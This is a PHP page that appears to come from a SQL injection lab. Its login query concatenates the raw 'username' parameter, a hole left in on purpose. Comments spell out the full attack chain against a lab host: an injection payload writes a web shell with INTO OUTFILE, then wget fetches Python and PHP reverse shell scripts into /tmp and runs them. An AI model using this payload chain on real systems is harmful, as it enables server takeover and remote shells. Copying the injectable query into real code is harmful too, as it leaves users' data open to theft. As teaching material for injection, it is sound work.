<?php

    require 'functions.php';
    require 'config.php';

    // Create a PHP script that will run commands
    // http://192.168.30.99/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;
    //
	// PYTHON BACKDOOR
	//
    // Download Python reverse shell
    // http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py
    //
    // Run new Python backdoor script
    // http://192.168.30.99/images/cmd.php?cmd=/tmp/reverse-shell.py
    //
	// PHP BACKDOOR - tbc
    //
    // Download PHP reverse shell
    // http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.php -O /tmp/reverse-shell.php
    // 
    // Run new PHP backdoor script
    // http://192.168.30.99/images/cmd.php?cmd=python /tmp/reverse-shell.php
    // 

    //file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");

    $username = $_GET['username'] ?? null;
    $password = $_GET['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username'";

    try {
        $stmt = $db->prepare($sql);
        $stmt->execute();
    } catch(PDOException $ex) {
        echo "Some error occured: $sql\n";
        dd($ex->getMessage());
    }

    $results = $stmt->fetchAll();

    dd($results);



?>

<form method="GET" action="">
    Username: <input type="text" name="username" /><br />
    Password: <input type="password" name="password" /><br />
</form>
